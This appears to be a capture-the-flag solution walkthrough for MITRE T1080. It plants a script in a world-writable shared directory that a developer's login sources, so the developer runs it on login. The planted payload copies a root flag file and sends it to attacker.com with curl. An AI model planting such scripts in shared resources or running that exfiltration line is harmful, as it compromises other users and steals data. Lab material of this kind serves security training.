# T1080 – Taint Shared Content | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Linux | **MITRE:** T1080

## Background
T1080 covers injecting malicious content into shared resources (scripts, repositories, drives)
that other users or systems will automatically execute.

## Step 1 – Identify the Shared Resource
```bash
ls -la /opt/shared-scripts/
# drwxrwxrwt  ← world-writable with sticky bit
cat /opt/shared-scripts/utils.sh  # legitimate script
# Check who uses it:
sudo grep -r "shared-scripts" /home/ 2>/dev/null
# /home/developer/.bashrc: source ~/.bashrc_extra → sources /opt/shared-scripts/*.sh
```

## Step 2 – Plant Malicious Script
```bash
# Write payload to shared directory:
cat > /opt/shared-scripts/evil.sh << 'EVILEOF'
#!/bin/bash
# T1080 payload — runs when developer logs in
cp /root/.flags/flag.txt /tmp/tainted.txt 2>/dev/null
chmod 644 /tmp/tainted.txt 2>/dev/null
# More stealthy: exfil silently:
curl -s http://attacker.com/collect -d "flag=$(cat /root/.flags/flag.txt)" &>/dev/null
EVILEOF
chmod 755 /opt/shared-scripts/evil.sh
```

## Step 3 – Trigger via Developer Login
```bash
su - developer
# Developer's .bashrc sources all /opt/shared-scripts/*.sh → our evil.sh runs!
exit
cat /tmp/tainted.txt
# HACKTIFY{TAINT_SHARED_CONTENT_<hash>}
```

## Real-World Analogues
- Poisoning shared NFS-mounted scripts
- Injecting into npm packages / pip packages (supply chain)
- Modifying shared Git hooks
- Poisoning Docker base images
